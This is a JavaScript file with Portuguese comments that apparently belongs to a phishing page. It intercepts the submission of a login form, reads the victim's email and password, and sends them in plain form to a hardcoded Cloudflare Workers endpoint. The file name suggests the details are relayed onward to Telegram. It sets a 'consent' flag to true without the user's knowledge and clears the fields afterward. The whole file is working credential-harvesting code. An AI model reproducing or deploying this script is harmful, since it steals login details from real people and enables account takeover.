
// telegram-integration.min.js (corrigido)
(function () {
  // URL do seu Cloudflare Worker
  const WORKER_URL = "https://flat-butterfly-fb71.leticiaramosjesus070.workers.dev/";

  function setup() {
    // Form correto no seu index.html
    const form = document.getElementById("loginForm");
    if (!form) {
      console.error("[telegram-integration] Form #loginForm não encontrado.");
      return;
    }

    // Listener de submit
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      // Ler pelos IDs existentes no HTML
      const email = document.getElementById("emailInput")?.value || "";
      const password = document.getElementById("passwordInput")?.value || "";
      const origemEl = form.querySelector("[name='origem']");
      const origem = origemEl ? origemEl.value : "form_index";

      // Se seu Worker exige consent, mantenha como true
      const payload = { email, password, origem, consent: true };

      try {
        const resp = await fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        const data = await resp.json().catch(() => ({}));

        if (!resp.ok || data.ok === false) {
          // Mostra erro amigável
          alert("Falhou o envio. " + (data.error || JSON.stringify(data)));
          return;
        }

     
        // Limpa campos (opcional)
        const p = document.getElementById("passwordInput");
        const eMail = document.getElementById("emailInput");
        if (p) p.value = "";
        if (eMail) eMail.value = "";
      } catch (err) {
        console.error("[telegram-integration] Erro:", err);
        alert("Erro de rede ao enviar.");
      }
    });
  }

  // Garante que o script rode após o DOM estar pronto
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", setup);
  } else {
    setup();
  }
})();
